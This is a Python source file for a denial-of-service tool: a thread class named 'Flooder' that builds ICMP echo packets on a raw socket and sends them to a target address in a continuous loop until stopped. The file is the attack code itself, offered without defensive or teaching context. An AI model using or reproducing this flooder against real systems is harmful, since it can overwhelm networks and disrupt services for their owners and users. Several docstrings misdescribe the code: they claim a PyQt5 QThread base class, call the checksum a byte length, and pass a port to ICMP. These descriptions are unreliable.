from logging import error, warning
from struct import pack, error as PackException
from threading import Event, Thread, ThreadError
from time import time, sleep
from typing import Any, Dict

from socket import (
    socket,
    htons,
    inet_aton,
    AF_INET,
    SOCK_RAW,
    IPPROTO_ICMP
)


class Flooder(Thread):
    """
    This class extends PyQt5.QtCore.QThread class which provides ability to launch
    run( method ) into own thread. This class build ICMP packet (header + body)
    and send to specified address:port.
    """

    def __init__(self, name: str, arguments: Dict[str, Any]):
        """
        The main Flooder constructor.

        Args:
            name (str): The current thread name.
            arguments (Dict[str, Any]): The dict with target info.

        """
        Thread.__init__(self, None)

        self.address = arguments.get('address')
        self.port_number = arguments.get('port')
        self.packet_length = arguments.get('length')
        self.sending_delay = arguments.get('delay')

        self.name = name
        self.shutdown_flag = Event()

    def _checksum(self, message) -> int:
        """
        This method returns the summary byte length of built ICMP-packet.

        Args:
        message (bytes): The byte array of ICMP-packet (header + body).

        Returns:
        int: The summary byte length.

        """

        summary = 0
        for index in range(0, len(message), 2):
            w = message[index] + (message[index + 1] << 8)
            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
        return htons(~summary & 0xffff)

    def _construct_packet(self) -> bytes:
        """
        This method returns bytes of IMCP-packet (header + body).

        Returns:
        bytes: The summary bytes of ICMP-packet.

        """

        header = pack("bbHHh", 8, 0, 0, 1, 1)
        data_fmt = (self.packet_length - 50) * 'Q'
        data = pack("d", time()) + data_fmt.encode('ascii')
        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
        return header + data

    def run(self):
        """
        This method runs with another thread to create ICMP-packet and send it
        to specified target ip-address.

        Raise:
        PackException: throws while invoke pack() method failed.
        KeyboardInterrupt: throws while user send SIGKILL or SIGINT signal
            to stop all threads whose sending packets.

        """
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)

        try:
            inet_aton(self.address)
            while not self.shutdown_flag.is_set():
                packet = self._construct_packet()
                sock.sendto(packet, (self.address, self.port_number))
                sleep(self.sending_delay)

        except PackException as err:
            error(msg=f'Failed while trying pack msg: {err}')
            warning(msg=f'The {self.name} thread has not been interrupted!')

        except ThreadError as err:
            error(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
            warning(msg=f'The {self.name} thread has been stopped!')

        except Exception as err:
            error(msg=f'Unknown runtime error into {self.name} thread!: {err}')

        finally:
            self.shutdown_flag.set()
            sock.close()
